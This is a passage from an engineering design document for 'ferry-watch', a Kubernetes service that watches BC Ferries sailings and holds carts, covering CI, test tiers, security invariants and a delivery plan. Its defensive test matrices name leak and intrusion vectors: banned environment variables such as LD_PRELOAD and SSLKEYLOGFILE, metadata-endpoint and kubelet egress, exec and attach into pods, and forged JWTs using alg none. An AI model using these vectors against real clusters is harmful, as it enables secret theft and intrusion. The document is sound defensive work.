  `Credentials` and `search_url`, moved out of `site.py:42-47`, `:66-87`), `terminals`, `errors`, notify
  formatters, the `protocol` schema (msgspec), the limits resolver and `identity`.
- **`packages/ferry-watch-control`:** `web`, `control` (hub endpoint and fleet loop), the outbox, Postgres
  (asyncpg), lightkube, migrations and the admin CLI. No Playwright or selectolax.
- **`packages/ferry-watch-agent`:** `site`, `parse`, the one-trip watcher, supervisor, gate and hub client.

`tests/conftest.py` monkeypatching is split per package. **import-linter contracts:** only
`ferry_watch_agent` imports `playwright`; `ferry_watch_control.web` imports neither `lightkube`,
`ferry_watch_control.control` nor `ferry_watch_agent`; `ferry_watch_core` imports none of them. A CI job
installs `ferry-watch-control` alone and imports every entrypoint.

**As built (a two-way door):** one distribution, `ferry-watch`, with the same boundaries drawn as subpackages
and held by import-linter (`[tool.importlinter]` in `pyproject.toml`, `lint-imports` in CI) instead of three
workspace members. Playwright and selectolax sit in a `browser` extra, so a control-plane image installs
without them (`uv sync --no-dev`); the agent image and today's single-container image add `--extra browser`.
Contracts so far: the shared core (`protocol`, `polling`, `holds`, `tickets`, `models`, `bcferries.urls`,
`terminals`, `errors`) never imports Playwright, selectolax, `site`, `parse` or the agent; the agent never imports
the single-container app. Contracts for `ferry_watch.control` and `ferry_watch.web` are added with those
packages. Splitting into workspace members later moves directories and changes no imports' direction.

New dependencies are `msgspec`, `asyncpg`, `lightkube`, `PyJWT[crypto]` (Ed25519 tickets, and the
`id_token`'s signature against the issuer's JWKS, RS256 by Authelia's default; the token-endpoint call is a plain aiohttp POST) and
`pywebpush` (or `http-ece` plus `py-vapid` on aiohttp). Each is checked against `filterwarnings = ["error"]`
(`pyproject.toml:84`) and the `aiohttp==3.10.10` pin (`:10`). lightkube's httpx does not clash with it. The
fallback is `kubernetes_asyncio` or a ~200-line aiohttp client.

### 11.2 Images

All images are digest-pinned, multi-target in one Dockerfile, numeric non-root, read-only root, and published
as `X.Y.Z@sha256` with provenance. SBOMs and cosign signatures come with admission-time verification (M4).
- **`ferry-watch-control`:** python:3.12-slim and tzdata (`models.py:14` needs `ZoneInfo` at import), plus the
  web build. uid 65532. Exec-form entrypoint.
- **`ferry-watch-browser`:** today's Playwright noble base (`Dockerfile:14`) plus the KasmVNC deb by sha256
  (`Dockerfile:20-32`), with Firefox and WebKit removed, policies in 3 directories, `USER 1001:1001` and
  `tini --`.
- **`ferry-watch-vnc-edge`:** §7.9.

*As built:* `control` and `browser` are targets in the root `Dockerfile`, beside today's single-container app
(still the default target); vnc-edge has its own (`vnc-edge/Dockerfile`, §7.9). The python:3.12-slim base
already carries tzdata. The browser image installs the policy with `install -D` (a `COPY --chmod=0444` would
also make the directories it creates untraversable, so Chromium could not read the policy), and the agent
creates `/tmp/.X11-unix` itself, since Xvnc only does that as root. Each image has a smoke test that CI runs
(`docker/control/smoke-test.sh`, `docker/browser/smoke-test.sh`); the browser one runs the agent's lockdown
self-test against a real Chromium in the image, with no network.
- **CI-only:** `ferry-watch-agent-e2e` carries the marker file that alone enables `FW_E2E_BASE_URL` and the
  127.0.0.1 allow policy; `fake-bcferries` is extracted from `tests/browser/test_site_flow.py` into a runnable
  server (with confirmation, expired-cart, login-wall and 3DS-iframe pages, synthetic until the pages
  captured during M1 replace them). It keeps serving `/login` and `/my-account` from the existing flow
  fixtures (`tests/fixtures/flow/login.html`, `my-account.html`), so the kept login path stays tested.

### 11.3 CI jobs

The existing four are `python`, `browser`, `web` and `image` [R:map-packaging-ci]. Added or changed:
- `python`: per-package unit tests, import-linter and a control-only install/import job. The Postgres tier
  runs against a service container.
- `apiserver`: envtest kube-apiserver binaries driven from pytest (marker `apiserver`; `pytest-socket` already
  allows 127.0.0.1, `pyproject.toml:79`).
- `chart`: `helm lint`, `helm-unittest`, and `helm template | kubeconform -strict`, with CRD schemas for Cilium,
  Gateway API and EG.
- `image`: matrix over {control, browser, vnc-edge, agent-e2e, fake-bcferries}. Smoke tests run with
  `--read-only --tmpfs /tmp --cap-drop ALL --security-opt no-new-privileges --user <uid>`, and the smoke-tested
  image is the one pushed, by digest.
  - control: `/livez` returns 200, and importing playwright fails.
  - browser: listeners are exactly {TCP 6080, TCP 8080, unix `/tmp/kasm/rfb.sock` 0600}; the policy files are
    in all 3 directories; no e2e marker; the termination message grammar.
  - vnc-edge: only the expected locations answer; `vnc.html` carries the shim tag before the module script;
    the CSP hash matches; the stock client, driven by headless Chromium against a fake gate, connects to the
    expected path with the expected subprotocols.
- `compose` (every PR): docker compose with postgres, web, control, agent-e2e, fake-bcferries, vnc-edge and a
  small fake OIDC issuer. It runs sign-in through the real OIDC path, ticket mint, gate, RFB banner and the
  refusals; a full guest hold; restarts of web and control mid-hold with zero carts lost and every cart alert
  delivered once; the SIGTERM drain.
- `kind-lite` (main, tags, and any PR touching `charts/`, the agent or the browser image): kind with its
  default CNI, the chart, one pinned pod; the VAP positive cases that need a real kubelet and GC (orphan and
  foreground deletion, eviction, NoExecute taint eviction, GC of Failed pods) and ferry-control's egress-label
  patch on a running pod; eviction-driven SIGTERM drain.
- `skew`: from the first protocol change after v1.
- The Playwright pin check runs against every FROM line that carries it.

The draft's kind e2e with Cilium and Envoy Gateway is dropped: kind cannot reproduce netkit, native routing,
kube-proxy replacement, cross-node SNAT or real DNS for `toFQDNs`, which are exactly the behaviours that
matter. They are proven on the home cluster (§11.4 tier 6).

### 11.4 Test tiers

1. **Unit:**
   - the one-trip watcher with `tests/fakes.py`: HoldPolicy clocks and the payment guard, compiled maxima,
     `alerted` versus `offered`, the lost-after-viewer rule, exit after a viewed hold, `_close_all` emptying,
     the `empty_cart` release check (landing URL now; empty cart once fixtures exist), booking detection,
     `checkout_login_seen` with `forced` set for a redirect into the login page and unset for a user-started
     visit, the hold-outcome record, the cart-claim gate on carting (no cart without a grant in the last
     30 s), the login path staying unreachable while its flag is off;
   - **door 1 kept alive:** today's watcher login and back-off tests (`tests/test_watcher.py:56-107`,
     `:292-301`, `:473-485`) ported to the one-trip agent with `login_enabled` forced on in the test, and the
     `SiteSession.login()` tests (`tests/browser/test_site_flow.py:264-274`) kept running against
     fake-bcferries, so the disabled path cannot rot unnoticed;
   - protocol codec plus hypothesis fuzzing (unknown types and fields, oversize, wrong trip, stale rev, an
     unknown `checkout_mode`);
   - identity, against a fake issuer: `id_token` signature, `alg: none` and an HS256 token keyed with the
     client secret (both refused), wrong `iss`, `aud` or `azp`, expired, wrong `nonce`, unknown `kid` (one
     JWKS refetch), a replayed code; uid derivation, alias precedence over `identities` rows and
     `bootstrapAdmins`, and an `identities` row whose uid disagrees (sign-in refused, admin alerted); an
     unmatched principal recorded; invitation binding by `preferred_username`, expiry and single use; the
     bootstrap admin binding; session hashing, idle and absolute expiry, re-verification due after 24 h and
     token rotation on it, revocation on logout, "sign out everywhere" and suspension; a socket closed when
     its own session is revoked or expires (and not when another session of the same user is); the
     WebSocket first-message deadline and 4 KiB message cap; per-client pre-auth limits; no `Set-Cookie` on
     any response; `TrustedHeaderProvider` refused with the external dashboard route;
   - repository scoping: a foreign trip gives 404 on every route; per-user Hub payloads;
   - the gate against a fake Xvnc unix socket: owner, cart, Origin, jti replay, lock, two simultaneous first
     viewers (exactly one wins), reconnect with `N` replacing a stale socket, ticket refused after the lock,
     revoke closes within 1 s, missed pong drops the viewer, failed-upgrade limit, `/api` and non-upgrade
     requests give 404;
   - a `browser_pod()` snapshot;
   - the fleet loop with `FakeCluster`: warm-trip selection and switching (never while Holding), short-check
     scheduling (due at once on add, every 6 h, the spare slot, no starvation), admission order, throttle,
     the egress label set at READY and cleared at hold end (and the pod deleted when clearing fails),
     adoption, silence rules frozen after a restart, cordon handling, failed-pod retention;
   - the poll curve against `polling.py` (tier boundaries, the 30 s floor, quiet hours across midnight, the
     horizon), and budget and brake properties: the sum of rates stays ≤ budget, the stretch keeps the
     curve's shape, the brake persists, fail-slow;
   - an agent in `short_check` mode checks once and exits, or carts and stays for the hold.
2. **Postgres-backed:** a concurrent-POST quota race (saved trips); concurrent cart claims for one user (exactly
   one granted) and claim expiry; RLS (web can't insert a
   `cart_held` notification); the `trips.user_id` immutability trigger; audit UPDATE and DELETE denied for
   both roles; LISTEN/NOTIFY round trips; delete-my-data.
3. **apiserver (envtest):** the **VAP leak-vector denial matrix**, one case per vector:
   - image (foreign, tag-only, third digest), command, args, workingDir;
   - each banned env (`DEBUG`, `PWDEBUG`, `NODE_OPTIONS`, `SSLKEYLOGFILE`, `HTTP(S)_PROXY`, `LD_PRELOAD`,
     `PYTHONPATH`, `BCF_BASE_URL`, `FW_E2E_BASE_URL`), an extra env, `envFrom`, `valueFrom`;
   - secret, configMap, hostPath, PVC, csi and extra projected volumes, `subPath`;
   - exec probe, lifecycle hook, init, ephemeral and extra containers, `shareProcessNamespace`, `hostAliases`,
     `dnsConfig`, `nodeName`, `nodeSelector`, `runtimeClassName`, `hostNetwork`;
   - the Multus annotation; ownerReferences; finalizers;
   - wrong SA, automount true, a missing or too-long `activeDeadlineSeconds`, a mismatched
     `FW_OWNER`/label/name, `hostUsers` true when required, a seccomp profile other than the param;
   - pod CREATE by a non-control SA, and by ferry-control in `ferry-watch`; a pod created with
     `ferry-watch.io/egress: hold`;
   - (M1) pod UPDATE by ferry-control that changes anything but the egress label (image, `activeDeadlineSeconds`,
     tolerations, another label, an annotation, both the label and something else), the label set to any
     value but `allowlist`/`hold`, the label changed by any other identity; ephemeralcontainers;
     exec/attach/portforward CONNECT;
   - (M2) Secret, Service, ConfigMap, HTTPRoute, Deployment and Job creation by app SAs.

   Plus **`can-i` negatives** for every forbidden verb in §7.3, for each app SA, in both namespaces.
4. **compose integration:** §11.3.
5. **kind-lite:** §11.3.
6. **Home-cluster post-deploy smoke** (after every deploy; the fleet loop stays in maintenance until it passes):
   ferry-control starts one pod with the reserved smoke trip id, which runs the egress matrix from inside the
   real CNP: *positive* bcferries.com and Queue-it through `toFQDNs` (with the Python resolver and with
   Chromium), the control endpoint by its FQDN; *denials* for the kube-apiserver, kubelet 10250, a node IP,
   169.254.169.254, another browser pod, ferry-web :8765, smtp-relay and `example.com`; and the lockdown
   self-tests. Then ferry-control sets the smoke pod's label to `hold`: `example.com:443` now loads and any
   name resolves, while every in-cluster, LAN, node and metadata denial still holds and port 80 stays shut;
   set back to `allowlist`, `example.com` is denied again. Hubble shows the denials. An echo check confirms
   no ferry backend receives a Cookie header (including requests with several Cookie headers and over
   HTTP/2), ferry-web receives no `Remote-*` header, and vnc-edge receives no Authorization; an
   unauthenticated `GET /api/state` returns 401. The `can-i` matrix runs against the live cluster.

### 11.5 Security invariants that block CI

- The VAP leak matrix and `can-i` negatives. A pod-template change without a matching matrix update fails.
- A helm-unittest forbidden-RBAC list for every SA (ferry-control's `pods` patch is the only patch verb, and
  the chart never renders it without `fw-browser-pod-lock`); `TrustedHeaderProvider` never renders enabled
  with the envoy-external route; quota ≤ budget; the hold-egress CNP's except-list contains every private,
  CGNAT, link-local and loopback range, and opens only TCP 443.
- Identity: the fake-issuer verification tests and the "no `Set-Cookie`" test (§11.4).
- The published browser image contains no e2e marker, has policies in 3 directories, and exposes only the
  expected listeners.
- import-linter boundaries: Playwright only in the agent; no `lightkube` in web.
- The protocol schema contains no URL or JS-capable fields (a test walks the schema).
- Gate unit tests: lock, simultaneous first viewers, replay, Origin, preemption by `N` only.
- The Chromium fence self-tests pass in the browser job: `file://`, `chrome://`, `view-source:`, a page fetch or
  WS to loopback.
- VAP params equal the control config, rendered from the same values.

The egress matrix is a post-deploy gate, not a pre-merge one: it can only be proven on the real Cilium.

### 11.6 Developer loop

- **Inner loop:** `docker compose up` runs Postgres, web, control (with a `FakeCluster` that runs the agent as
  a local container), agent-e2e against fake-bcferries, vnc-edge, and a fake OIDC issuer (or the dev header
  adapter for quick UI work).
  It needs about 4 GiB RAM and 2 CPUs. Each browser container adds about 1.5 GiB.
- **Chart and admission work:** kind (default CNI) plus envtest; about 6 GiB RAM.
- **Reproducing a live failure:** run the browser image locally against the live site with `FW_TRIP_ID` set and
  a local fake control endpoint; debug snapshots stay in the container's tmpfs.

---
## 12. Delivery plan

### 12.1 Spikes

**No spike tests guest checkout, and no booking is made only to test** (owner, round 2: "No spike for now,
assume it works and if not we will adjust later, don't make any one way door decisions on this"). S1, S2,
S2b, S5, S6, S7 and the live part of S-FIX are gone from W0 and from the critical path. What they would have
produced now comes from the owner's real use during M1 (fixtures) and from production detection and
telemetry, behind reversible defaults (§5.7). The spikes that remain are cluster or local experiments that
decide design branches. Most never touch BC Ferries; S-MEM reads real BC Ferries pages the way watching
does; S-DRAIN and the M1 VNC exit check briefly hold one real cart on a sailing with space and release it, as
the product itself does. (S-3DS, which used the household's real checkouts and optionally walked a card to
the 3DS step, is gone: hold egress replaces the 3DS allowlist, round 3.) Spike days are counted in the
calendar (§12.3), not run "in parallel" with code.

| Spike | When | Exact experiment | Pass | If it fails |
|---|---|---|---|---|
| **Fixture capture** (replaces the live part of S-FIX; not a spike and not a gate) | M1, during the owner's real use | Capture, as `tests/fixtures/README.md` describes, each page the owner meets on real trips: cart and review, the confirmation page, the page after a release and the empty cart, an expired cart, a login wall or account-required page if one ever appears, a "date beyond the schedule" page, and a block or challenge page if one ever appears. | Fixtures exist for what was seen; the classifiers, booking detection and the full empty-cart check use them. | Pages not yet seen stay on the conservative path: `MarkupChanged`, the user's "Did you book it?" answer, a best-effort release (§5.2). |
| **S-KIOSK** (local, Playwright 1.56 under matchbox) | W0 | Policies in 3 dirs plus `--kiosk` plus a persistent context. Try escapes (Ctrl+T/N/O/U/Shift+I, closing the last window). Run the self-tests (§5.6) including the LNA policy names. Xvnc with `-rfbunixpath` and no WebSocket listener; a prototype gate bridging WS ↔ unix socket; the stock KasmVNC client through the shim. Does `URLBlocklist ["*"]` block a cross-origin subframe? Check `handle_sig*=False` plus the supervisor drain ordering. Type into a 6-field form with phone keyboards' burst patterns (no `DLP_KeyRateLimit`). | The CDP pipe works under the policies. Every escape is blocked. No TCP listeners but the gate's and the probe server's. The stock client connects through the shim. TERM reaches only the agent and the cart is emptied before Chromium stops. Typed values are byte-exact. | No pod-served VNC until it passes; fall back to Xvnc WebSocket on 127.0.0.1:6081 behind a per-boot BasicAuth credential, with self-tests 2-3 blocking. |
| **S-VNC-lite** (cluster) | W0 | A throwaway pod running the S-KIOSK gate prototype and showing a static test page (never today's unauthenticated container, never a BC Ferries session) behind a static HTTPRoute on envoy-external under a random path, through the Cloudflare tunnel. From iPhone Safari, the iOS home-screen app (opened from a notification) and Android Chrome: background the browser for 90 s (bank-app approval), switch Wi-Fi to LTE, leave a static page for 3 min; with 20 s pings. Where does `N` live on the iOS home-screen path, and does a return via the dashboard find it? Exact CSP (QOI on/off). Rocket Loader off. Gate CPU at 15 fps. | Reconnects within 10 s in every case; `N` survives the return on all three clients; gate ≤ 0.3 CPU. | If iOS loses `N`: no takeover ticket (owner, round 3); iPhone users check out in Safari or on a computer, revisited with the owner's M1 data. If Cloudflare cuts sockets despite pings, shorten the ping. |
| **S-CIL** (cluster) | W0 | Apply `nameError` (home-cluster). Check `cilium config view` for the DNS proxy. Apply the browser CNP to a test pod. Then: `toFQDNs` reach bcferries.com with the Python resolver and in Chromium; the control endpoint resolves by its FQDN (with and without the trailing dot); DNS for other names fails; the deny matrix holds (apiserver, LAN, nodes, pods, smtp-relay, observability). With Hubble, check whether vnc-edge→pod and pod→control traffic is SNATed cross-node. Check the bandwidth annotation with netkit. **Hold egress (round 3):** apply `fw-browser-hold-egress`, flip the test pod's `ferry-watch.io/egress` label to `hold` and back while it keeps a bcferries.com connection open: how long until public 443 opens and closes, whether the open connection survives, and that private, node, metadata and in-cluster destinations stay denied in both states. | All of these work; the flip takes effect within 5 s both ways. | `toCIDRSet` fallback plus `kube-apiserver`-entity ingress where SNATed; a per-pod egress proxy moves from M4 to M2. If the flip is slow or drops connections: public HTTPS always (§7.6 option B). |
| **S-OIDC** (cluster; replaces S-AUTH) | W0 | Register the Authelia client (redirect on `ferry-next.chestr.dev`) and the chart's dashboard route, pointed at a test build of ferry-web's sign-in (or an echo backend plus a script). Check: Authorization Code + PKCE with `response_mode=fragment` accepted by Authelia 4.39 at runtime; a user outside `ferry-watch`/`admin` is denied, and removing a signed-in test user from the group makes their next re-verification fail (`access_denied`); a remembered consent makes the second sign-in silent; `prompt=none` answers as documented; ferry-web reaches the token endpoint and JWKS through the CNP rule to the envoy-external pods on 10443; the echo shows no Cookie (also with several Cookie headers and over HTTP/2) and `Authorization` intact; the WebSocket upgrade passes. | All as stated. | Fragment refused: `query` mode with the stated C15 exception (§2.3). Egress rule fails: `toCIDRSet` for the LB address, or `toFQDNs` if in-cluster DNS returns public addresses. |
| **S-TR** (cluster) | W0 | TokenReview with audience returns `extra` pod-uid and pod-name. VAP with ConfigMap params. VAP CONNECT denies exec. The pod-lock VAP's UPDATE rule: ferry-control's label patch passes; a patch that also changes the image, a toleration or another label is denied; `object.spec == oldObject.spec` compares as expected in CEL. | All work on 1.36.5. | RBAC-only for CONNECT; note it. If the UPDATE rule can't be expressed: no `pods` patch, and §7.6 option B. |
| **S-MEM** (cluster) | W0, checkout part in M1 | W0: cgroup working set (`memory.peak`, `container_memory_working_set_bytes`, including tmpfs) on real pages while Watching (no cart); CPU; pod create → first check p50/p95 with a cold and a warm image. M1: the same during the owner's real holds with a viewer (no hold made for the measurement). | Numbers recorded. | Sets `podMemory`, `cpuRequest` and `maxBrowsersTotal` (§8.4); `podMemory` stays at 1.5 GiB until the checkout numbers exist. |
| **S-DB** | W0 | The cnpg component with `APP=ferrywatch`; the stock `postgres-init` creates the DB; CNPG managed roles appear; `db-migrate` grants, RLS and trigger work; LISTEN/NOTIFY through `postgres17-rw`. | Works. | One login role for both processes, as a stated residual. |
| **S-DRAIN** | M1 | `talosctl reboot --drain` (or a TalosUpgrade) on one node in a quiet window, with one Watching pod and one Holding pod on a far-out sailing with space (a brief real hold, released by the drain; no booking). | Watching pod moved; the hold released in order with an alert; the reboot proceeds. | Fix the agent drain before M1 exit. |
| **S-IOS** (owner's iPhone) | M1 | In the home-screen app: a first sign-in with a password from the invite (`one_factor`, no enrolment); a re-sign-in after the app session expires (shortened in a test config) and a re-verification while the Authelia session lives; a notification tap with the app session expired. In the first sign-in and one re-sign-in, background the app for 1-3 min during the Authelia password step (switching to Mail or a password manager), then return. Also, from the owner's real holds: whether a checkout keeps the device nonce `N` (the no-takeover answer is revisited with this). Do the redirect to Authelia and the way back stay inside the home-screen app, with its sessionStorage and localStorage, and does the app survive the switch? | Sign-in completes inside the app in every case and lands on the saved path. | The fallbacks in §6.2.4 for whichever case fails: the 10-minute localStorage pending sign-in, the first sign-in in Safari or on a computer, or the handoff code (about 1 extra day); R18. |
| **S-PUSH** | M2 | Web Push on an iOS 16.4+ home-screen app and on Android; notification click → `/c/<trip>`, including with the app session expired (re-sign-in returns to `/c`). SES: the `invited` email and a `cart_held` email reach an invitee address. | All as stated. | Email-first onboarding; SES identity per invitee. |
| **S-VNCID** | M4 | §12.2 M4. | — | R3 stays accepted. |
| **S-SBX** (one node; *optional, backlog*, about 1 day) | only if the owner chooses the hardening (M4, Q1) | Apply the Talos `user.max_user_namespaces` change and a `machine.seccompProfiles` Localhost profile (containerd default plus `clone`/`unshare` with namespace flags and `chroot`). Run `chromium_sandbox=True` in a PSA-restricted pod under that profile; separately, `hostUsers: false`. | `chrome://sandbox` shows the namespace sandbox and seccomp-BPF; the exact syscall additions are recorded. | `--no-sandbox` stays (R2). Not a gate. |
| **S-IDP** | at an IdP change | The new issuer (or a broker such as Dex, Pocket ID or authentik) as an `OidcProvider` entry: redirect URI, claim names, invite-match claim, and alias proposals for existing users (§6.2.6). | Works with the new IdP. | Keep the current issuer. |

**Removed in round 2:** S1, S2, S2b, S5, S6, S7 and the live part of S-FIX (guest checkout assumed; replaced by
fixture capture and production detection, §5.7); S3 and S4 (they belonged to the removed M5); S-AUTH
(replaced by S-OIDC). S-SBX moves from W0 to the optional backlog. **Removed in round 3:** S-3DS (hold
egress makes any bank's 3DS host reachable, so there is no list to learn); S-CIL and S-TR gain the hold-egress
checks.

### 12.2 Milestones (each one shippable)

**W0: De-risk (about 1.5 weeks).** The W0 spikes above (S-KIOSK, S-VNC-lite, S-CIL with the hold-egress
flip, S-OIDC, S-TR with the pod-lock UPDATE rule, S-MEM's watching part, S-DB: all local or on the cluster,
none holding a cart), plus three small PRs: Cilium `nameError` (home-cluster); the frontend
`.catch('unknown')`; an opening-visibility metric on the current deployment (background data for tuning the
curve, not a gate). Exit: every W0 spike has a pass or a chosen fallback. No owner answer is needed for W0
(§14.1 lists what rounds 2 and 3 settled): Q2 is needed before the first invitee, Q1 before the first
non-household invitee, Q3 whenever convenient.

**M1: The owner on the new stack (about 13.5-16.5 weeks).**
- Deliverables:
  - **Code split:** uv workspace, `urls.py` out of `site.py`, import-linter.
  - **Agent and pod runtime:** OneTripStore, HoldPolicy with the payment guard, compiled maxima, guest
    auto-cart, `alerted`/`offered`, the `empty_cart` release check, `_close_all` emptying, liveness checks,
    booking detection, the lost-after-viewer rule, exit after a viewed hold, typed alerts and events, the new
    error classes; the login code kept behind its disabled flag; the supervisor (Xvnc on a unix socket,
    `tini --`, SIGTERM drain, termination message), kiosk policies and self-tests; the gate.
  - **Poll curve and short checks (round 3):** `configure.mode`, the agent's `short_check` mode, warm-trip
    selection and switching, the short-check schedule and spare slot, the curve and budget stretch in the hub
    (from `polling.py`), the `cart_claim` pair and `hold_claims` (one hold per user), the badges and next-check
    times in the dashboard.
  - **Hold egress (round 3):** the `fw-browser-hold-egress` CNP, the label flip with retries and the
    fail-closed delete, ferry-control's `pods` patch, and `fw-browser-pod-lock` with its one-label exception
    (moved here from the old M3), with envtest denials, the kind-lite positive and both smoke states.
  - **Guest-checkout production detection** (§5.7): `checkout_login_seen` with `forced`, expired-cart
    detection, "Did you book it?" reasons (the trip paused until answered), the outcome, release and duration
    metrics, the hold-outcome record, the `guest_checkout_failing` alert,
    `alertOnlyFareTypes`/`alertOnlyVehicleTypes`, and `checkout_mode` in the schema and the protocol; the kept
    login path's tests ported (§11.4).
  - **Fixture capture** during the owner's real use (§12.1), with the classifiers, booking detection and the
    full empty-cart check following as pages arrive; S-MEM's checkout measurement from the same holds.
  - **ferry-control:** hub endpoint (binding, protocol, `trip_state`, commands, cart claims, curve, budget,
    brake) and fleet loop (warm selection, short checks, reconcile, queue, timers, reaper, hold-egress label,
    cordon handling, adoption, failed-pod retention, smoke pod).
  - **ferry-web:** OIDC sign-in (`OidcProvider`, sessions with 24 h IdP re-verification, bearer and
    WebSocket auth with session-bound sockets, invitations, unmatched identities and the bootstrap admin),
    user-scoped repository and API, per-user hub, ticket minting, `/c/<trip>` chooser,
    outbox with email, the frontend (§10 items 1-5, 7-9); S-IOS on the owner's iPhone, and the handoff-code
    fallback if it fails.
  - **vnc-edge** (stock client, shim, landing page, CSP).
  - **Postgres:** schema, roles, RLS, trigger; the import CLI.
  - **Chart:** two VAPs (`fw-browser-pod`, `fw-browser-pod-lock`), quotas, LimitRange, PriorityClass, both
    browser egress policies, db Jobs, routes on `ferry-next.chestr.dev`.
  - **CI:** python, apiserver (leak matrix including the UPDATE cases, `can-i`), chart, image, compose (with
    the fake issuer), kind-lite.
  - **home-cluster PR 1:** the `ferry-watch` namespace with components, the OCIRepository and HelmRelease,
    ExternalSecrets, CNPG managed roles, the Authelia OIDC client (`one_factor`) and its authorization policy
    (with the 1Password `authelia` fields and Authelia's ExternalSecret entries), the smtp-relay rule,
    silences, the Fluent Bit and descheduler exclusions, the Cloudflare rule, the GrafanaDashboard.
  - **Cutover** (§12.5), with the legacy app scaled to zero and kept, with its PVC and the BC Ferries
    fields, until a real guest checkout has worked on the new stack.
- Exit criteria:
  - The compose tier passes restarts of web and control during holds and a drain during a hold, against
    fake-bcferries, with 0 carts lost and every cart alert delivered once; a short-check pod carts and holds
    while the warm pod keeps watching, and a second opening at the same time is refused a claim.
  - The post-deploy smoke is green on the home cluster in both egress states; S-DRAIN done; S-IOS passed, or
    the fallback shipped.
  - At least 1 real hold opened through VNC on the owner's iPhone (from the owner's own trips, or a sailing
    with space within the 30-day horizon: a brief real hold, released without booking), with one
    ferry-control restart during that hold. No booking is made only to test (owner, round 2); the owner's
    first real guest checkout on the new stack, whenever it comes, is the end-to-end proof (including a real
    bank's 3DS page through hold egress) and supplies the remaining fixtures, with the alert-only switch ready
    and the legacy app still restorable (§5.7, §12.5).
  - The owner runs only the new stack for 7 days.

**M2: Invitees, the household first, then wider (about 3.5-4 weeks; the owner's soak and the household period
overlap it).**
- Deliverables: Web Push, the service worker and the onboarding page (S-PUSH); admin Fleet and Users pages,
  "Add person" with invitations and the `invited` email, limits with provenance, suspend, delete user,
  session revocation; delete-my-data; brake and the simplified breaker; the cross-tenant suite;
  home-cluster: Authelia `authorization_policies` for the other OIDC clients and the lldap group **before
  anyone new is added to lldap**; each invitee's email deliverable; the tenant disclosure (R1 including the
  CI runner, R4 naming Cloudflare, R22, Canada/US only) in the invite email and an About page; one restore
  rehearsal; then, before the wider stage, the `fw-ns-objects` VAP with the live `can-i` matrix and SES
  production access (both from the old M3).
- Exit criteria, household stage: the cross-tenant suite is green (API 404s, WS payloads, VNC IDOR, Origin,
  replay, lock, second viewer, after release, another user's session token refused after revocation); the
  quota and cart-claim race tests pass; up to 3 household invitees for 14 days with no Pending pods, no short
  check overdue by more than 2 h, and admin time under 10 min/day; Q2 answered before the first of them.
- Exit criteria, wider stage: every item in §12.4 is green; Q1 decided; 3-5 non-household invitees for 14
  days.
- The legacy app is deleted only when §12.5 step 8's conditions hold (at least 14 days and a real guest
  checkout on the new stack), not on a fixed date.
- **Why the old M3 is merged into M2 (round 3).** M3 was S-3DS (gone: hold egress replaces the 3DS
  allowlist), the runner restriction (gone: left as is), the database variant (gone: the standard component
  stays), the pod-lock VAP (moved to M1, because hold egress needs it) and the `fw-ns-objects` VAP plus SES
  production access. What is left is about 1.5-2 days of work and a soak, too little for a milestone of its
  own. The audience step stays: the household comes first and the wider stage needs the §12.4 cut line, Q1
  decided and its own 14 days. The optional sandbox hardening is part of M2 only if the owner makes it a gate
  under Q1; otherwise it can come from M4 before inviting people the owner doesn't know well.

**M4: Hardening backlog** (each item ships alone, ordered by observed need):
- **Optional sandbox and kernel hardening** (the owner's call, Q1; recommended before inviting people the
  owner doesn't know well; R2): S-SBX on one node (about 1 day), then the Talos sysctl and Localhost seccomp
  profile applied per node, VAP params `sandbox`, `seccompProfile` and `requireUserNamespace`,
  `hostUsers: false` (about 3 days): about 4 days in all; and a decision on `mitigations=off`.
- Device handoff ("continue on another device" QR code).
- S-VNCID (closes R3, accepted for v1): an EG OIDC SecurityPolicy on the VNC route with the token carried
  correctly — remove only Cookie, have Envoy set a dedicated header (for example `X-FW-IdP-Token`) after
  deleting any client copy, let nginx forward it only on `/ws`, verify it in the pod against a JWKS in VAP
  params, test forged-header overwrite and token refresh at the upgrade (a 302 there breaks the socket).
- Hold protection during Talos upgrades: hold PDBs plus TalosUpgrade `drainTimeout`/`timeout`, or a tuppr
  health check (§7.8).
- Breaker canaries; weighted water-filling with AIMD leases and a fleet simulator.
- TLS or Cilium WireGuard on :8766 (R10); a per-pod rate-limiting egress proxy (R13).
- A shorter IdP re-verification period, or device-bound session tokens (a DPoP-style proof from a
  non-extractable WebCrypto key), if R17 needs a smaller window.
- cosign signatures, SBOMs and admission-time verification.
- Admin Trips, Settings and Audit pages and a DB policy table (including the poll curve); the request-access
  queue (with a social IdP); the `identityAliases` CLI.
- A warmer DaemonSet if cold starts hurt (long-running container on the browser image, automount false, no
  secrets); it would also shorten short checks.
- A one-time "+10 min" session extension if data shows sessions ending early; linked outbound/return pairs
  (Q3).
- The protocol skew CI job (from the first protocol change); arm64 if ever needed.

**M5 is removed** (owner, round 2: no pre-cart sign-in window, first-list Q1). Attended sign-in is listed as a
possible future option in §15. The kept login code, `checkout_mode`, the VAP's `optionalEnv`, the ticket's
`aud` and C22's checkout scope mean adding it later undoes nothing, but it is still real work (about 1.5
weeks, the old M5 estimate; the list is in §15) and needs the owner's explicit decision.

### 12.3 Effort and calendar (one developer, focused days)

| Milestone | Workstream | Days |
|---|---|---|
| W0 | S-KIOSK (with the gate and bridge prototype) | 2 |
| | S-CIL (with the hold-egress flip), S-VNC-lite, S-OIDC, S-TR (with the pod-lock UPDATE rule), S-MEM, S-DB | 4.5-5.5 |
| | Three small PRs | 0.5-1 |
| | **W0 total** | **7-8.5** |
| M1 | Workspace split, `urls.py`, import-linter | 2 |
| | One-trip agent | 9-11 |
| | Poll curve and short checks: `short_check` mode, warm-trip selection and switching, short-check schedule and spare slot, curve and stretch in the hub, cart claims, badges (net of the removed Dormant, Waiting and 409 paths) | 2-2.5 |
| | Hold egress: second CNP, label flip with retries and fail-closed delete, `pods` patch, `fw-browser-pod-lock` with its label exception (about half of this moved from the old M3), envtest, kind-lite and smoke cases | 2-2.5 |
| | Guest-checkout production detection (forced or voluntary login, hold-outcome record), `checkout_mode`, alert-only by fare and vehicle type, porting the kept login path's tests | 1.5-2 |
| | Fixture capture from the owner's real use; classifiers and the full empty-cart check | 1-1.5 |
| | Supervisor, Xvnc unix socket, kiosk policies, self-tests, SIGTERM drain | 4-5 |
| | Gate | 3-4 |
| | Protocol, hub client, fake hub | 3 |
| | Images (browser, vnc-edge, agent-e2e, fake-bcferries) | 3-4 |
| | ferry-control hub endpoint | 4-5 |
| | ferry-control fleet loop | 5-6 |
| | Postgres schema, migrations, roles, RLS, trigger, import CLI | 3 |
| | ferry-web (scoped API, per-user hub, tickets, `/c`, outbox and email) | 4-5 |
